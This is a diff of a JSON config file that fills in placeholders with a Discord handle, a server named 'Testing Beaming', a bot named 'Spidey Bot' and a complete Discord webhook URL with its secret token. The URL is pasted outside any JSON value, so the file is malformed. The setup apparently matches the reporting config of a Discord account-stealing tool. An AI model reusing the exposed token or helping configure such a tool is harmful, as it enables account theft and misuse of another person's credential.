@@ -2,17 +2,17 @@
     "Title_Configs":[
         {
 
-           "name": "Your_Name_here",
-           "servername": "Your_Server_Name",
-           "program": "Your_Program_Name"
+           "name": "angvsl#1889",
+           "servername": "Testing Beaming",
+           "program": "idk what to put"
 
         }
     ],
 
-    "Webhook_config":[
+    "Webhook_config":[https://discord.com/api/webhooks/1059388965767090256/zkJAD8GkDUUuvFaNxadVUpKeg9RHRri-u7FroHdZm4ISCx4ybYvCVpXZ9s_zcTXszxyn
         {
 
-          "Bot_Name": "YourBotName",
+          "Bot_Name": "Spidey Bot",
           "Bot_Avatar": "https://media.discordapp.net/attachments/818904459681071126/1008774401648505013/goat6.jpg"
   
         }
